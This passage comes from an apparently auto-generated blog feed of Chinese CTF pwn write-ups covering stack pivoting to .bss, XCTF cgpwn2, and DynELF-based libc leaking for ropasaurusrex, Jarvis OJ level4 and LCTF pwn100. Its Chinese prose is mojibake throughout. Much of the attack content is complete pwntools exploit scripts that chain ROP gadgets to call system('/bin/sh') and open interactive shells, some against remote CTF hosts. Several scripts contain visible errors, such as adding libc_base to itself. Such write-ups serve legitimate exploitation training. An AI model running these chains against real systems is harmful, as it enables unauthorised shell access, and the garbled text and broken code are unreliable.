ç–‘é—®ï¼Œé‡Œé¢çš„å€¼å°±ä¼šæ”¹åŠ¨äº†ï¼Œç¨‹åºæ¥ä¸‹æ¥å‘ç”Ÿä»€ä¹ˆæ˜¯å¾ˆéš¾é¢„æµ‹çš„ï¼Œå¹¶ä¸”ä¸ªäººä¹Ÿæ‹¿ä¸åˆ°åŸæœ¬çš„gotåœ°å€ï¼Œä»è€Œç®—å‡ºlibcåŸºåœ°å€ã€‚å¹¶ä¸”ä¼šå‘ç°ï¼Œå½“ä»¥å¾€å›åˆ°startå¤„æ¸…ç†æ ˆæƒ³å†æ¬¡åˆ©ç”¨æ¼æ´çš„æ—¶å€™ï¼Œä¹Ÿæ˜¯ä¸è¡Œäº†ï¼Œä¹Ÿæ˜¯å› ä¸ºä¸çŸ¥é“ä»€ä¹ˆæ•°æ®è¢«æ”¹åŠ¨ï¼Œé€ æˆäº†å½±å“ã€‚</p><h4 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h4><p>å°±æ˜¯æŠŠæ ˆè¿ç§»åˆ°bssæ®µçš„å°½é‡é åï¼Œè¿™æ ·å°±ä¼šå°½é‡ä¸å½±å“åˆ°gotè¡¨å’ŒåŸæœ¬æ­£å¸¸çš„æ•°æ®ã€‚è¿”å›åœ°å€ä¸å†æ˜¯è‡ªå·±å¸¸å¸¸ç”¨çš„startå¤„ï¼Œæ¢æˆå…¶ä»–åˆé€‚çš„åœ°æ–¹ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./borrowstack&#39;)# io = remote(&#39;123.56.85.29&#39;,3635)elf = ELF(&#39;./borrowstack&#39;)# libc = elf.libcleave_addr = 0x0400699offset = 200buf_addr = 0x000601080padding = 0x60start_addr = 0x0400626p = &#39;\x00&#39;* padding + p64(buf_addr+offset) + p64(leave_addr)pop_rsi_rx_ret = 0x400701 io.recvuntil(&#39;want\n&#39;)raw_input(&#39;-&gt;&#39;)io.send(p)io.recvuntil(&#39;stack now!\n&#39;)libc_start_main =  elf.got[&#39;__libc_start_main&#39;]puts_plt = elf.symbols[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]pop_rdi_ret = 0x400703read_got = elf.got[&#39;read&#39;]p = flat([&#39;b&#39;*offset,(buf_addr+offset),pop_rdi_ret,puts_got,puts_plt,start_addr])raw_input(&#39;-&gt;&#39;)io.sendline(p)puts_add = u64((io.recv(6)).ljust(8,&#39;\x00&#39;))print(hex(puts_add))obj = LibcSearcher(&#39;puts&#39;,puts_add)libc_base = puts_add - obj.dump(&#39;puts&#39;)print(hex(libc_base))sleep(0.1)rec = libc_base + 0x4526asystem_addr = libc_base + libc_basebinsh_addr = libc_base + libc_baseprint(hex(system_addr))print(hex(binsh_addr))io.recvline()io.recvuntil(&#39;want\n&#39;)p = &#39;\x00&#39;* padding + p64(1) + p64(rec)io.send(p)io.interactive()</code></pre><h3 id="ç»“è®ºå’Œæ”¶è·"><a href="#ç»“è®ºå’Œæ”¶è·" class="headerlink" title="ç»“è®ºå’Œæ”¶è·"></a>ç»“è®ºå’Œæ”¶è·</h3><p>ç»“è®ºï¼šå½“æ ˆè¿ç§»åˆ°bssæ®µä»¥åï¼Œç”±äºlibcå‡½æ•°çš„è°ƒç”¨ï¼Œæ­¤æ—¶æ ˆæ…¢æ…¢å¢é«˜ï¼Œbssæ®µä»¥ä¸Šçš„æ•°æ®ä¹Ÿå¯èƒ½ä¼šè¢«æ”¹åŠ¨ã€‚<br>æ”¶è·ï¼šå½“å†é‡åˆ°æ ˆè¿ç§»é—®é¢˜çš„æ—¶å€™ï¼Œè¦æ³¨æ„bssæ®µä¸gotçš„è·ç¦»ï¼Œè¿”å›åœ°å€å†™å…¥startåœ°å€ï¼Œå‘ç°å‡ºç°é—®é¢˜çš„æ—¶å€™ï¼Œå°±è¯¥æå‡æ ˆè¿ç§»çš„åœ°å€é«˜åº¦ï¼Œå’Œæ‰¾ä¸ªåˆé€‚çš„è¿”å›ä½ç½®ï¼Œå†æ¬¡åˆ©ç”¨æ¼æ´ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XCTF\_pwnæ–°æ‰‹</title>
    <link href="/2020/02/17/XCTF_pwn%E6%96%B0%E6%89%8B/"/>
    <url>/2020/02/17/XCTF_pwn%E6%96%B0%E6%89%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="XCTF-pwnæ–°æ‰‹"><a href="#XCTF-pwnæ–°æ‰‹" class="headerlink" title="XCTF_pwnæ–°æ‰‹"></a>XCTF_pwnæ–°æ‰‹</h1><h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch"><a href="#æŸ¥ä¿æŠ¤å’Œarch" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><pre><code class="objc">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="/2020/02/17/XCTF_pwnæ–°æ‰‹/images/15819436335898.jpg" srcset="/img/loading.gif" alt="-w605"><br>æ¼æ´å°±åœ¨è¿™så¤„ï¼Œgetså¯ä»¥æ— é™è¯»å–ï¼Œå¯¼è‡´æ ˆæº¢å‡ºã€‚</p><h4 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><ol><li>ç¬¬ä¸€ä¸ªfgetsè·å–æ—¶å€™ï¼Œè¯»å–ä¸€ä¸ª<code>/bin/sh\x00</code>è¿›å»ï¼Œå› ä¸ºnameçš„åœ°å€æ˜¯å›ºå®šçš„ã€‚</li><li>getå‡½æ•°è·å–æ—¶å€™ï¼Œpadding + system_plt +nameåœ°å€å³å¯ã€‚</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;# io = process(&#39;./cgpwn2&#39;)io = remote(&#39;111.198.29.45&#39;,40540)elf = ELF(&#39;./cgpwn2&#39;)io.recvuntil(&#39;name\n&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(&#39;/bin/sh\x00&#39;)system_plt = elf.symbols[&#39;system&#39;]padding = 0x26 + 4binsh_add = 0x0804A080payload = padding * &#39;a&#39; + p32(system_plt) + p32(0x0804A080) + p32(binsh_add)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯</title>
    <link href="/2020/02/15/%E5%88%A9%E7%94%A8DynElf%E6%A8%A1%E5%9D%97%E5%AE%8C%E6%88%90%E8%8E%B7%E5%8F%96libc%E4%BF%A1%E6%81%AF/"/>
    <url>/2020/02/15/%E5%88%A9%E7%94%A8DynElf%E6%A8%A1%E5%9D%97%E5%AE%8C%E6%88%90%E8%8E%B7%E5%8F%96libc%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯"><a href="#åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯" class="headerlink" title="åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯"></a>åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è®°å½•ä¸€ä¸‹å¦ä¸€ç§æ²¡æœ‰libcï¼Œå®Œæˆæ¼æ´åˆ©ç”¨çš„åŠæ³•ï¼Œå­¦å®Œåè‡ªæˆ‘æ„Ÿè§‰è¿™ä¸ªåŠæ³•å·²ç»æ¯”è¾ƒè½åäº†ï¼Œæ²¡æœ‰libcseacherå¥½ç”¨ï¼Œä¹Ÿç”¨èµ·æ¥æ¯”å®ƒéš¾çš„å¤šäº†ã€‚é’ˆå¯¹äºlibcseacherä¸èƒ½åšçš„é¢˜ï¼Œç”¨è¿™ç§åŠæ³•ï¼Œå¦åˆ™è¿˜æ˜¯libcseacherå¥½ç”¨ã€‚</p><h2 id="Dynelf"><a href="#Dynelf" class="headerlink" title="Dynelf"></a>Dynelf</h2><p>è§£æåŠ è½½çš„ã€åŠ¨æ€é“¾æ¥çš„ELFâ¼†è¿›åˆ¶â½‚ä»¶ä¸­çš„ç¬¦å·ã€‚ç»™å®šâ¼€ä¸ªå¯ä»¥åœ¨ä»»æ„åœ°å€æ³„æ¼æ•°æ®çš„å‡½æ•°ï¼Œä»»ä½•åŠ è½½çš„ åº“ä¸­çš„ä»»ä½•ç¬¦å·éƒ½å¯ä»¥è¢«è§£æã€‚ï¼ˆå®˜æ–¹æ–‡æ¡£è§£é‡Šï¼‰</p><h3 id="åŸºæœ¬ä½¿ç”¨æ¡†æ¶ï¼š"><a href="#åŸºæœ¬ä½¿ç”¨æ¡†æ¶ï¼š" class="headerlink" title="åŸºæœ¬ä½¿ç”¨æ¡†æ¶ï¼š"></a>åŸºæœ¬ä½¿ç”¨æ¡†æ¶ï¼š</h3><pre><code>io = remote(ip, port)def leak(addr):    payload = &quot;xxxxxxxx&quot; + addr + &quot;xxxxxxxx&quot;    io.send(payload)    data = io.recv()    #debugç”¨çš„    print(&quot;%x -&gt; %s&quot; %(addr, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return data#åˆå§‹åŒ–DynELFæ¨¡å— d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)system_addr = d.lookup(â€œsystemâ€, &#39;libc&#39;)</code></pre><p>å…¶ä¸­ç¬¬2ä¸ªå‚æ•°ï¼Œå¯ä»¥ä¸ä¼ ã€‚è¿›è¡Œçš„å·¥ä½œä¸»è¦é›†ä¸­åœ¨leakå‡½æ•°çš„å…·ä½“å®ç°ä¸Šï¼Œä¸Šé¢çš„ä»£ç åªæ˜¯ä¸ªæ¨¡æ¿ã€‚å…¶ä¸­ï¼Œaddrå°±æ˜¯leakå‡½æ•°è¦æ³„æ¼ä¿¡æ¯çš„æ‰€åœ¨åœ°å€ã€‚<strong>æ­£æ˜¯è¿™ä¸ªaddrçš„å‚æ•°çš„å­˜åœ¨ï¼Œæ‰è®©Dynelfå‡½æ•°åœ¨å†…å­˜ä¸­åˆ°å¤„çš„leakä»¥åŠå¯¹æ¯”æ˜¯å¦æ˜¯æˆ‘ä»¬å¯»æ‰¾çš„sympols</strong>ã€‚</p><p>ä¸”ç”±äºDynELFä¼šå¤šæ¬¡è°ƒç”¨leakå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¿…é¡»èƒ½ä»»æ„æ¬¡ä½¿ç”¨ï¼Œå³ä¸èƒ½æ³„éœ²å‡  ä¸ªåœ°å€ä¹‹åå°±å¯¼è‡´ç¨‹åºå´©æºƒã€‚ç”±äºéœ€è¦æ³„éœ²æ•°æ®ï¼Œpayloadä¸­å¿…ç„¶åŒ…å«ç€æ‰“å°å‡½æ•°ï¼Œå¦‚write, puts, printfç­‰ã€‚</p><h3 id="ä½¿ç”¨æ¡ä»¶ï¼š"><a href="#ä½¿ç”¨æ¡ä»¶ï¼š" class="headerlink" title="ä½¿ç”¨æ¡ä»¶ï¼š"></a>ä½¿ç”¨æ¡ä»¶ï¼š</h3><p>ä¸ç®¡æœ‰æ²¡æœ‰libcæ–‡ä»¶ï¼Œè¦æƒ³è·å¾—ç›®æ ‡ç³»ç»Ÿçš„systemå‡½æ•°åœ°å€ï¼Œé¦–å…ˆéƒ½è¦æ±‚ç›®æ ‡äºŒè¿›åˆ¶ç¨‹åºä¸­å­˜åœ¨ä¸€ä¸ªèƒ½å¤Ÿæ³„æ¼ç›®æ ‡ç³»ç»Ÿå†…å­˜ä¸­libcç©ºé—´å†…ä¿¡æ¯çš„æ¼æ´ã€‚åŒæ—¶ï¼Œç”±äºæˆ‘ä»¬æ˜¯åœ¨å¯¹æ–¹å†…å­˜ä¸­ä¸æ–­æœç´¢åœ°å€ä¿¡æ¯ï¼Œæ•…æˆ‘ä»¬éœ€è¦è¿™æ ·çš„ä¿¡æ¯æ³„éœ²æ¼æ´èƒ½å¤Ÿè¢«åå¤è°ƒç”¨ã€‚ä»¥ä¸‹æ˜¯å¤§è‡´å½’çº³çš„ä¸»è¦ä½¿ç”¨æ¡ä»¶ï¼š</p><ul><li>ç›®æ ‡ç¨‹åºå­˜åœ¨å¯ä»¥æ³„éœ²libcç©ºé—´ä¿¡æ¯çš„æ¼æ´ï¼Œå¦‚read@gotå°±æŒ‡å‘libcåœ°å€ç©ºé—´å†…ï¼›</li><li>ç›®æ ‡ç¨‹åºä¸­å­˜åœ¨çš„ä¿¡æ¯æ³„éœ²æ¼æ´èƒ½å¤Ÿåå¤è§¦å‘ï¼Œä»è€Œå¯ä»¥ä¸æ–­æ³„éœ²libcåœ°å€ç©ºé—´å†…çš„ä¿¡æ¯ã€‚</li></ul><p>ä»¥ä¸Šä»…ä»…æ˜¯å®ç°åˆ©ç”¨çš„åŸºæœ¬æ¡ä»¶ï¼Œä¸åŒçš„ç›®æ ‡ç¨‹åºå’Œè¿è¡Œç¯å¢ƒéƒ½ä¼šæœ‰ä¸€äº›å‘éœ€è¦ç»•è¿‡ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¸»è¦é’ˆå¯¹writeå’Œputsè¿™ä¸¤ä¸ªæ™®éç”¨æ¥æ³„æ¼ä¿¡æ¯çš„å‡½æ•°åœ¨å®é™…é…åˆDynELFå·¥ä½œæ—¶å¯èƒ½é‡åˆ°çš„é—®é¢˜ï¼Œç»™å‡ºç›¸åº”çš„è§£å†³æ–¹æ³•ã€‚</p><h3 id="ä½¿ç”¨writeå‡½æ•°æ¥æ³„éœ²"><a href="#ä½¿ç”¨writeå‡½æ•°æ¥æ³„éœ²" class="headerlink" title="ä½¿ç”¨writeå‡½æ•°æ¥æ³„éœ²"></a>ä½¿ç”¨writeå‡½æ•°æ¥æ³„éœ²</h3><p>writeå‡½æ•°åŸå‹æ˜¯write(fd, addr, len)ï¼Œå³å°†addrä½œä¸ºèµ·å§‹åœ°å€ï¼Œè¯»å–lenå­—èŠ‚çš„æ•°æ®åˆ°æ–‡ä»¶æµfdï¼ˆ0è¡¨ç¤ºæ ‡å‡†è¾“å…¥æµstdinã€1è¡¨ç¤ºæ ‡å‡†è¾“å‡ºæµstdoutï¼‰ã€‚</p><p>å…¶è¾“å‡ºå®Œå…¨ç”±å…¶å‚æ•°lenå†³å®šï¼Œåªè¦ç›®æ ‡åœ°å€å¯è¯»ï¼Œsizeå¡«å¤šå°‘å°±è¾“å‡ºå¤šå°‘ï¼Œä¸ä¼šå—åˆ°è¯¸å¦‚â€˜\0â€™, â€˜\nâ€™ä¹‹ç±»çš„å­—ç¬¦å½±å“ã€‚å› æ­¤leakå‡½æ•°ä¸­å¯¹æ•°æ®çš„è¯»å–å’Œå¤„ç†è¾ƒä¸ºç®€å•ã€‚ä½†æ˜¯å…¶ä¸€ä¸ªä¸å¥½çš„åœ°æ–¹ï¼Œå°±æ˜¯éœ€è¦ä¼ é€’3ä¸ªå‚æ•°ï¼Œåœ¨é¢å¯¹64ä½ç¨‹åºçš„æ—¶å€™ï¼Œå…¶ä¸­rdxè¿™ä¸ªå¯„å­˜å™¨æ˜¯æ¯”è¾ƒéš¾å¤„ç†çš„ã€‚å°±ä¸å¾—ä¸ç”¨ä¸‡èƒ½gadgetäº†ã€‚</p><h4 id="ä¸‡èƒ½gadget"><a href="#ä¸‡èƒ½gadget" class="headerlink" title="ä¸‡èƒ½gadget"></a>ä¸‡èƒ½gadget</h4><p><img src="/2020/02/15/åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯/images/15817628590359.jpg" srcset="/img/loading.gif" alt="-w817"><br>è¿™ä¸ªæ˜¯libc_initå‡½æ•°çš„æ±‡ç¼–ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ä¸€å®šè¦è°ƒç”¨çš„ï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶rdi,rsi,rdx,æ‰€ä»¥èƒ½ç§°çš„ä¸Šä¸‡èƒ½gadgetã€‚å¯¹äºä½¿ç”¨è¿™æ®µgadgetï¼Œé¦–å…ˆåœ¨åˆè¯†å‡½æ•°çš„retå¤„å¡«å…¥å¦‚å›¾æ‰€æŒ‡çš„<code>pop rbx</code>çš„åœ°å€ï¼Œç„¶åçœ‹ä¸‹æ ˆå¦‚ä½•æ¥å¸ƒç½®ï¼š<br><img src="/2020/02/15/åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯/images/15817631112375.jpg" srcset="/img/loading.gif" alt="-w486"><br>ï¼ˆå…¶ä¸­ä¸ºä»€ä¹ˆå¡«å…¥gotåœ°å€ï¼Œæ˜¯å› ä¸ºæ¥ä¸‹æ¥retåˆ°<code>mov rdx,r13</code>åé¢çš„call qword ptr[r12+rbx*8] å…¶æ˜¯callè¿™ä¸ªåœ°å€çš„ã€‚ï¼‰<br>åœ¨ç¬¬ä¸€æ®µpop åretåœ°å€è¦å¡«å…¥<code>mov rdx,r13</code>çš„åœ°å€ï¼Œç„¶åå†æ…¢æ…¢æ‰§è¡Œï¼Œå½“æ‰§è¡Œå®Œæˆcallä»¥åï¼Œæµç¨‹è¿˜ä¼šå›åˆ°è¿™ä¸€æ®µ<br><img src="/2020/02/15/åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯/images/15817633402017.jpg" srcset="/img/loading.gif" alt="-w259"><br>æ‰€ä»¥æˆ‘ä»¬ä¸ºäº†å†æ¬¡åˆ©ç”¨æœ€åé‚£ä¸ªretnï¼Œretåˆ°è‡ªå·±æƒ³å»çš„åœ°æ–¹ï¼Œè¦åœ¨æ ˆä¸Šæ‘†å¥½7*8=56ä¸ªå­—èŠ‚ã€‚æ¥ä¸‹æ¥ç»ƒä¹ å…³äºwriteä¸¤ä¸ªé¢˜ç›®ã€‚</p><h4 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF 2013 ropasaurusrex"></a>PlaidCTF 2013 ropasaurusrex</h4><h5 id="æŸ¥ä¿æŠ¤å’Œarch"><a href="#æŸ¥ä¿æŠ¤å’Œarch" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h5><pre><code>   Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><pre><code>ssize_t sub_80483F4(){  char buf; // [esp+10h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre><p>å‡½æ•°ååˆ†ç®€å•ï¼Œæº¢å‡ºåœ¨è¿™ä¸ªä½ç½®ã€‚å¹¶ä¸”plté‡Œé¢æœ‰writeå‡½æ•°ï¼Œç„¶åå°±ç”¨å®ƒæ¥æ³„éœ²ã€‚</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code>from pwn import *io = process(&#39;./ropasaurusrex&#39;)elf = ELF(&#39;./ropasaurusrex&#39;)buf = 0x8049620padding = 140write_add = elf.symbols[&#39;write&#39;]start_addr = 0x08048340def leak(addr):    p = &#39;&#39;    p += padding * &#39;a&#39;    p += p32(write_add)    p += p32(start_addr)    p += p32(1)    p += p32(addr)    p += p32(0x4)    io.sendline(p)    content = io.recv(4)    # print(&quot;%x -&gt; %s&quot; %(addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))    return contentd = DynELF(leak,elf=elf)system_add = d.lookup(&#39;system&#39;,&#39;libc&#39;)read_add = d.lookup(&#39;read&#39;,&#39;libc&#39;)log.info(&quot;system_add = %x&quot;, system_add)log.info(&quot;read_add = %x&quot;, read_add)p = padding * &#39;a&#39; + p32(read_add) + p32(system_add) + p32(0) + p32(buf) + p32(8)io.sendline(p)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h4 id="Jarvis-oj-leave4"><a href="#Jarvis-oj-leave4" class="headerlink" title="Jarvis_oj_leave4"></a>Jarvis_oj_leave4</h4><h5 id="æŸ¥ä¿æŠ¤å’Œarch-1"><a href="#æŸ¥ä¿æŠ¤å’Œarch-1" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h5><pre><code>[*] &#39;/media/psf/mypwn2/jarvis_OJ/level4/level4&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><p><img src="/2020/02/15/åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯/images/15817716059093.jpg" srcset="/img/loading.gif" alt="-w420"></p><pre><code>ssize_t vulnerable_function(){  char buf; // [esp+0h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre><p>æ¼æ´å‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚è¿˜æ˜¯è·Ÿä¸Šé¢˜ä¸€æ ·çš„æ€è·¯ã€‚</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code>from pwn import *import time# context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./level4&#39;)io = remote(&#39;pwn2.jarvisoj.com&#39;,9880)elf = ELF(&#39;./level4&#39;)__libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]write_plt = elf.symbols[&#39;write&#39;]start_addr = 0x08048350padding = 140def leak(addr):    payload = padding * &#39;a&#39; + p32(write_plt) + p32(start_addr) + p32(1) + p32(addr) +p32(0x4)    io.sendline(payload)    data = io.recv(4)    print(&quot;%x -&gt; %s&quot; %(addr, (data or &#39;&#39;).encode(&#39;hex&#39;)))    return datad = DynELF(leak,elf = elf)system_addr = d.lookup(&#39;system&#39;,&#39;libc&#39;)info(&#39;system_addr = %#x&#39; %system_addr)read_addr = d.lookup(&#39;read&#39;,&#39;libc&#39;)info(&#39;read_addr = %#x&#39; %read_addr)binsh_add = 0x804A01Cpayload = padding * &#39;a&#39; + p32(read_addr) + p32(system_addr) + p32(0) + p32(binsh_add) + p32(8)io.sendline(payload)sleep(0.1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h3 id="ä½¿ç”¨putså‡½æ•°æ¥æ³„éœ²"><a href="#ä½¿ç”¨putså‡½æ•°æ¥æ³„éœ²" class="headerlink" title="ä½¿ç”¨putså‡½æ•°æ¥æ³„éœ²"></a>ä½¿ç”¨putså‡½æ•°æ¥æ³„éœ²</h3><p>printf, putsè¿™ç±»å‡½æ•°çš„ç‰¹ç‚¹æ˜¯ä¼šè¢«ç‰¹æ®Šå­—ç¬¦å½±å“ï¼Œputsçš„åŸå‹æ˜¯puts(addr)ï¼Œå³å°†addrä½œä¸ºèµ·å§‹åœ°å€è¾“å‡ºå­—ç¬¦ä¸²ï¼Œç›´åˆ°é‡åˆ°â€œx00â€å­—ç¬¦ä¸ºæ­¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>putså‡½æ•°è¾“å‡ºçš„æ•°æ®é•¿åº¦æ˜¯ä¸å—æ§çš„ï¼Œåªè¦æˆ‘ä»¬è¾“å‡ºçš„ä¿¡æ¯ä¸­åŒ…å«x00æˆªæ–­ç¬¦ï¼Œè¾“å‡ºå°±ä¼šç»ˆæ­¢ï¼Œä¸”ä¼šè‡ªåŠ¨å°†â€œnâ€è¿½åŠ åˆ°è¾“å‡ºå­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œè¿™æ˜¯putså‡½æ•°çš„ç¼ºç‚¹</strong>ï¼Œè€Œä¼˜ç‚¹å°±æ˜¯éœ€è¦çš„å‚æ•°å°‘ï¼Œåªæœ‰1ä¸ªï¼Œæ— è®ºåœ¨x32è¿˜æ˜¯x64ç¯å¢ƒä¸‹ï¼Œéƒ½å®¹æ˜“è°ƒç”¨ã€‚</p><h4 id="é’ˆå¯¹ç¼ºç‚¹çš„æ”¹è¿›åŠæ³•"><a href="#é’ˆå¯¹ç¼ºç‚¹çš„æ”¹è¿›åŠæ³•" class="headerlink" title="é’ˆå¯¹ç¼ºç‚¹çš„æ”¹è¿›åŠæ³•"></a>é’ˆå¯¹ç¼ºç‚¹çš„æ”¹è¿›åŠæ³•</h4><h5 id="putsè¾“å‡ºå®Œåå°±æ²¡æœ‰å…¶ä»–è¾“å‡º"><a href="#putsè¾“å‡ºå®Œåå°±æ²¡æœ‰å…¶ä»–è¾“å‡º" class="headerlink" title="putsè¾“å‡ºå®Œåå°±æ²¡æœ‰å…¶ä»–è¾“å‡º"></a>putsè¾“å‡ºå®Œåå°±æ²¡æœ‰å…¶ä»–è¾“å‡º</h5><p>leakå‡½æ•°æ¨¡æ¿<br>    def leak(address):<br>      count = 0<br>      content = â€˜â€™<br>      payload = xxx<br>      p.send(payload)<br>      print p.recvuntil(â€˜xxxnâ€™) #ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º<br>      up = â€œâ€<br>      while True:<br>        c = p.recv(numb=1, timeout=0.1)<br>        count += 1<br>        if up == â€˜\nâ€™ and c == â€œâ€:  #æ¥æ”¶åˆ°çš„ä¸Šä¸€ä¸ªå­—ç¬¦ä¸ºå›è½¦ç¬¦ï¼Œè€Œå½“å‰æ¥æ”¶ä¸åˆ°æ–°å­—ç¬¦ï¼Œåˆ™<br>         content += content[:-1]  +â€™\x00â€™            #åˆ é™¤putså‡½æ•°è¾“å‡ºçš„æœ«å°¾å›è½¦ç¬¦<br>          break<br>        else:<br>          content += c<br>        up = c<br>      content = content[:4]  #å–æŒ‡å®šå­—èŠ‚æ•°<br>      log.info(â€œ%#x =&gt; %sâ€ % (address, (content or â€˜â€™).encode(â€˜hexâ€™)))<br>      return content<br>å…¶ä¸­<code>c = p.recv(numb=1, timeout=0.1)</code>ç”±äºæ¥æ”¶å®Œæ ‡å¿—å­—ç¬¦ä¸²ç»“æŸçš„å›è½¦ç¬¦åï¼Œå°±æ²¡æœ‰å…¶ä»–è¾“å‡ºäº†ï¼Œæ•…å…ˆç­‰å¾…0.1ç§’é’Ÿï¼Œå¦‚æœç¡®å®æ¥æ”¶ä¸åˆ°äº†ï¼Œå°±è¯´æ˜è¾“å‡ºç»“æŸäº†ã€‚ä»¥ä¾¿ä¸ä¸æ˜¯æ ‡å¿—å­—ç¬¦ä¸²ç»“æŸçš„å›è½¦ç¬¦ï¼ˆ0x0Aï¼‰æ··æ·†ï¼Œè¿™ä¹Ÿåˆ©ç”¨äº†recvå‡½æ•°çš„timeoutå‚æ•°ï¼Œå³å½“timeoutç»“æŸåä»å¾—ä¸åˆ°è¾“å‡ºï¼Œåˆ™ç›´æ¥è¿”å›ç©ºå­—ç¬¦ä¸²â€â€</p><h5 id="putsè¾“å‡ºå®Œåè¿˜æœ‰å…¶ä»–è¾“å‡º"><a href="#putsè¾“å‡ºå®Œåè¿˜æœ‰å…¶ä»–è¾“å‡º" class="headerlink" title="putsè¾“å‡ºå®Œåè¿˜æœ‰å…¶ä»–è¾“å‡º"></a>putsè¾“å‡ºå®Œåè¿˜æœ‰å…¶ä»–è¾“å‡º</h5><pre><code>def leak(address):  count = 0  content = &quot;&quot;  payload = xxx  p.send(payload)  print p.recvuntil(&quot;xxxn&quot;)) #ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º  up = &quot;&quot;  while True:    c = p.recv(1)    count += 1    if up == &#39;\n&#39; and c == &quot;x&quot;:  #ä¸€å®šè¦æ‰¾åˆ°æ³„æ¼ä¿¡æ¯çš„å­—ç¬¦ä¸²ç‰¹å¾      content = content[:-1] + &quot;x00&quot;                        break    else:      content += c    up = c  content = content[:4]   log.info(&quot;%#x =&gt; %s&quot; % (address, (content or &#39;&#39;).encode(&#39;hex&#39;)))  return content</code></pre><h4 id="Lctf-2016-pwn100"><a href="#Lctf-2016-pwn100" class="headerlink" title="Lctf_2016_pwn100"></a>Lctf_2016_pwn100</h4><h5 id="æŸ¥ä¿æŠ¤å’Œarch-2"><a href="#æŸ¥ä¿æŠ¤å’Œarch-2" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h5><pre><code>[*] &#39;/media/psf/mypwn2/ichunqiu/0x05/LCTF 2016-pwn100/pwn100&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h5 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" 